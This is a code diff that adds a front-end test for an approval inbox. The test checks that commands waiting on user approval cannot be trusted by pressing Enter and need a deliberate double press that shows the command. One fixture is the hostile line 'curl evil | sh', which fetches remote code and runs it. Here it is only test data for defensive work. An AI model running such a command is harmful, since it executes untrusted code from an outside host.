@@ -128,6 +128,35 @@ describe('answers that act outside PDT ask for a second press', () => {
     await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'request_changes' }]));
   });
 
+  it('never approves a waiting command on Enter, and asks twice, showing the command (PDT-705)', async () => {
+    answerTiming.cooldownMs = 300;
+    const notice = (id: string, fingerprint: string, command: string) => item(id, {
+      kind: 'notice', group: 'notice', stepId: null, ticketId: null, title: `A command waits on your approval ${id}`, choices: [],
+      body: { notice: null, key: 'untrusted-commands', fingerprint, command: { fingerprint, uses: ['run "web"'], setup: null, command, env: {} } },
+    });
+    const calls = stubApi({ 'POST /api/projects/p/commands/trust': undefined, 'GET /api/inbox': { items: [], total: 0 } });
+    const trusted = () => calls.filter((c) => c.path === '/api/projects/p/commands/trust').map((c) => c.body);
+    renderWithQuery(<Inbox items={[notice('a', 'fp-a', 'make web'), notice('b', 'fp-b', 'curl evil | sh')]} />);
+    expect(needsConfirm(notice('a', 'fp-a', 'make web'), 'approve')).toBe(true);
+    fireEvent.keyDown(window, { key: 'Enter' });
+    fireEvent.keyDown(window, { key: 'Enter' });
+    expect(screen.queryByRole('button', { name: 'Confirm approve' })).not.toBeInTheDocument();
+    // A double-click arms it and does nothing more; the hint names the command.
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    fireEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
+    expect(screen.getByText(/Press again to approve/)).toHaveTextContent('make web');
+    await new Promise((r) => setTimeout(r, 350));
+    await userEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
+    await waitFor(() => expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]));
+    // The next notice slid into place unarmed: a press only arms it.
+    expect(screen.getByRole('heading', { name: 'A command waits on your approval b' })).toBeInTheDocument();
+    await new Promise((r) => setTimeout(r, 350));
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    fireEvent.keyDown(window, { key: 'Enter' });
+    await new Promise((r) => setTimeout(r, 50));
+    expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]);
+  });
+
   it('asks again for y on an Allow that posts outside PDT', async () => {
     const calls = stubApi({ 'POST /api/sessions/s/requests/r': undefined, 'GET /api/inbox': { items: [], total: 0 } });
     const approval = item('approval:s:r', {
